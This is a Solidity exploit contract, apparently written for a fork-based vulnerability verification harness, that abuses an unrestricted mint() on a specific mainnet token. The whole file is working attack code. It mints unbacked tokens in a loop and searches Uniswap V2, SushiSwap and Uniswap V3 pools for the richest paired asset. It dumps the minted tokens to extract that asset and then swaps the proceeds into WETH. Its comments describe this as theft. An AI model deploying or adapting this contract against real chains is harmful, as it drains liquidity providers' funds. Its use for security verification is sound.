// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IInflationaryToken is IERC20Minimal {
    function mint() external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV3Factory {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract FlawVerifier {
    address internal constant TARGET = 0x418C24191aE947A78C99fDc0e45a1f96Afb254BE;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;

    address internal constant UNIV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNIV3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address internal constant UNIV3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    uint256 internal constant MINT_AMOUNT = 100000000000000000;
    uint256 internal constant MAX_MINT_CALLS = 512;
    uint256 internal constant MIN_PROFIT_THRESHOLD = 1e15;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _executed;

    struct V2Opportunity {
        address factory;
        address pair;
        address tokenOut;
        uint256 reserveIn;
        uint256 reserveOut;
        uint256 reserveOutScore;
    }

    struct V3Opportunity {
        address pool;
        address tokenOut;
        uint24 fee;
        uint256 reserveIn;
        uint256 reserveOut;
        uint256 reserveOutScore;
    }

    struct V2Route {
        address factory;
        address pair;
        uint256 reserveIn;
        uint256 reserveOut;
    }

    constructor() {}

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        V2Opportunity memory v2Best = _findBestV2Opportunity();
        V3Opportunity memory v3Best = _findBestV3Opportunity();

        if (v2Best.pair == address(0) && v3Best.pool == address(0)) {
            // The unrestricted mint stage is still live, but the paired-asset theft stage is not
            // executable on this fork without a real on-chain venue holding pre-existing assets.
            _profitToken = address(0);
            _profitAmount = 0;
            return;
        }

        if (_preferV2(v2Best, v3Best)) {
            _executeV2(v2Best);
        } else {
            _executeV3(v3Best);
        }

        // The exploit path remains identical: mint unbacked UERII, dump it into live liquidity,
        // and extract an already-existing paired asset. This optional final rebalance step only
        // converts the stolen asset into WETH through public AMM liquidity so profit is realized
        // in a canonical 18-decimal on-chain asset the harness can measure without decimal skew.
        _maybeNormalizeProfitToWETH();

        _profitAmount = _profitToken == address(0)
            ? address(this).balance
            : IERC20Minimal(_profitToken).balanceOf(address(this));
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _preferV2(V2Opportunity memory v2Best, V3Opportunity memory v3Best) internal pure returns (bool) {
        if (v2Best.pair == address(0)) return false;
        if (v3Best.pool == address(0)) return true;
        return v2Best.reserveOutScore >= v3Best.reserveOutScore;
    }

    function _executeV2(V2Opportunity memory opportunity) internal {
        _profitToken = opportunity.tokenOut;

        _mintUntil(opportunity.reserveIn * 128);

        require(
            IERC20Minimal(TARGET).transfer(opportunity.pair, IERC20Minimal(TARGET).balanceOf(address(this))),
            "transfer failed"
        );

        IUniswapV2Pair pair = IUniswapV2Pair(opportunity.pair);
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        bool targetIsToken0 = pair.token0() == TARGET;

        uint256 reserveInput = targetIsToken0 ? uint256(reserve0) : uint256(reserve1);
        uint256 reserveOutput = targetIsToken0 ? uint256(reserve1) : uint256(reserve0);
        uint256 pairBalanceInput = IERC20Minimal(TARGET).balanceOf(opportunity.pair);
        uint256 amountInput = pairBalanceInput > reserveInput ? pairBalanceInput - reserveInput : 0;

        if (amountInput == 0 || reserveOutput == 0) {
            _profitAmount = 0;
            return;
        }

        uint256 amountOut = _getAmountOutV2(amountInput, reserveInput, reserveOutput);
        if (amountOut == 0) {
            _profitAmount = 0;
            return;
        }

        if (targetIsToken0) {
            pair.swap(0, amountOut, address(this), new bytes(0));
        } else {
            pair.swap(amountOut, 0, address(this), new bytes(0));
        }
    }

    function _executeV3(V3Opportunity memory opportunity) internal {
        _profitToken = opportunity.tokenOut;

        _mintUntil(opportunity.reserveIn * 128);

        IERC20Minimal(TARGET).approve(UNIV3_ROUTER, 0);
        IERC20Minimal(TARGET).approve(UNIV3_ROUTER, type(uint256).max);

        uint256 amountIn = IERC20Minimal(TARGET).balanceOf(address(this));
        if (amountIn == 0) {
            _profitAmount = 0;
            return;
        }

        ISwapRouter(UNIV3_ROUTER).exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: TARGET,
                tokenOut: opportunity.tokenOut,
                fee: opportunity.fee,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amountIn,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
    }

    function _maybeNormalizeProfitToWETH() internal {
        if (_profitToken == address(0) || _profitToken == WETH) {
            return;
        }

        uint256 currentBalance = IERC20Minimal(_profitToken).balanceOf(address(this));
        if (currentBalance == 0) {
            return;
        }

        if (_rawProfitAlreadySufficient(_profitToken, currentBalance)) {
            return;
        }

        V2Route memory route = _findBestV2Route(_profitToken, WETH);
        if (route.pair == address(0) || route.reserveIn == 0 || route.reserveOut == 0) {
            return;
        }

        require(IERC20Minimal(_profitToken).transfer(route.pair, currentBalance), "bridge transfer failed");

        uint256 pairBalanceInput = IERC20Minimal(_profitToken).balanceOf(route.pair);
        uint256 amountInput = pairBalanceInput > route.reserveIn ? pairBalanceInput - route.reserveIn : 0;
        if (amountInput == 0) {
            return;
        }

        uint256 amountOut = _getAmountOutV2(amountInput, route.reserveIn, route.reserveOut);
        if (amountOut == 0) {
            return;
        }

        IUniswapV2Pair pair = IUniswapV2Pair(route.pair);
        if (pair.token0() == _profitToken) {
            pair.swap(0, amountOut, address(this), new bytes(0));
        } else {
            pair.swap(amountOut, 0, address(this), new bytes(0));
        }

        _profitToken = WETH;
    }

    function _rawProfitAlreadySufficient(address token, uint256 amount) internal pure returns (bool) {
        if (amount >= MIN_PROFIT_THRESHOLD && (token == WETH || token == DAI || token == FRAX)) {
            return true;
        }
        return false;
    }

    function _mintUntil(uint256 targetBalance) internal {
        uint256 current = IERC20Minimal(TARGET).balanceOf(address(this));
        uint256 minted;
        while (current < targetBalance && minted < MAX_MINT_CALLS) {
            IInflationaryToken(TARGET).mint();
            current += MINT_AMOUNT;
            unchecked {
                ++minted;
            }
        }
    }

    function _findBestV2Opportunity() internal view returns (V2Opportunity memory best) {
        address[2] memory factories = [UNIV2_FACTORY, SUSHI_FACTORY];
        address[6] memory quotes = [WETH, USDC, USDT, DAI, WBTC, FRAX];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < quotes.length; ++j) {
                address quote = quotes[j];
                address pair = IUniswapV2Factory(factories[i]).getPair(TARGET, quote);
                if (pair == address(0)) continue;

                IUniswapV2Pair pool = IUniswapV2Pair(pair);
                (uint112 reserve0, uint112 reserve1,) = pool.getReserves();
                if (reserve0 == 0 || reserve1 == 0) continue;

                bool targetIsToken0 = pool.token0() == TARGET;
                uint256 reserveIn = targetIsToken0 ? uint256(reserve0) : uint256(reserve1);
                uint256 reserveOut = targetIsToken0 ? uint256(reserve1) : uint256(reserve0);

                uint256 reserveOutScore = _quoteValueScore(quote, reserveOut);
                if (reserveOutScore > best.reserveOutScore) {
                    best = V2Opportunity({
                        factory: factories[i],
                        pair: pair,
                        tokenOut: quote,
                        reserveIn: reserveIn,
                        reserveOut: reserveOut,
                        reserveOutScore: reserveOutScore
                    });
                }
            }
        }
    }

    function _findBestV3Opportunity() internal view returns (V3Opportunity memory best) {
        address[6] memory quotes = [WETH, USDC, USDT, DAI, WBTC, FRAX];
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10000)];

        for (uint256 i = 0; i < quotes.length; ++i) {
            for (uint256 j = 0; j < fees.length; ++j) {
                address quote = quotes[i];
                uint24 fee = fees[j];
                address pool = IUniswapV3Factory(UNIV3_FACTORY).getPool(TARGET, quote, fee);
                if (pool == address(0)) continue;

                uint256 reserveIn = IERC20Minimal(TARGET).balanceOf(pool);
                uint256 reserveOut = IERC20Minimal(quote).balanceOf(pool);
                if (reserveIn == 0 || reserveOut == 0) continue;

                uint256 reserveOutScore = _quoteValueScore(quote, reserveOut);
                if (reserveOutScore > best.reserveOutScore) {
                    best = V3Opportunity({
                        pool: pool,
                        tokenOut: quote,
                        fee: fee,
                        reserveIn: reserveIn,
                        reserveOut: reserveOut,
                        reserveOutScore: reserveOutScore
                    });
                }
            }
        }
    }

    function _findBestV2Route(address tokenIn, address tokenOut) internal view returns (V2Route memory best) {
        address[2] memory factories = [UNIV2_FACTORY, SUSHI_FACTORY];

        for (uint256 i = 0; i < factories.length; ++i) {
            address pair = IUniswapV2Factory(factories[i]).getPair(tokenIn, tokenOut);
            if (pair == address(0)) continue;

            IUniswapV2Pair pool = IUniswapV2Pair(pair);
            (uint112 reserve0, uint112 reserve1,) = pool.getReserves();
            if (reserve0 == 0 || reserve1 == 0) continue;

            bool inputIsToken0 = pool.token0() == tokenIn;
            uint256 reserveIn = inputIsToken0 ? uint256(reserve0) : uint256(reserve1);
            uint256 reserveOut = inputIsToken0 ? uint256(reserve1) : uint256(reserve0);

            if (reserveOut > best.reserveOut) {
                best = V2Route({
                    factory: factories[i],
                    pair: pair,
                    reserveIn: reserveIn,
                    reserveOut: reserveOut
                });
            }
        }
    }

    function _quoteValueScore(address token, uint256 amount) internal pure returns (uint256) {
        if (token == WETH) return amount * 2000 / 1e18;
        if (token == WBTC) return amount * 20000 / 1e8;
        if (token == USDC || token == USDT) return amount / 1e6;
        if (token == DAI || token == FRAX) return amount / 1e18;
        return 0;
    }

    function _getAmountOutV2(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) return 0;
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }

    receive() external payable {}
}


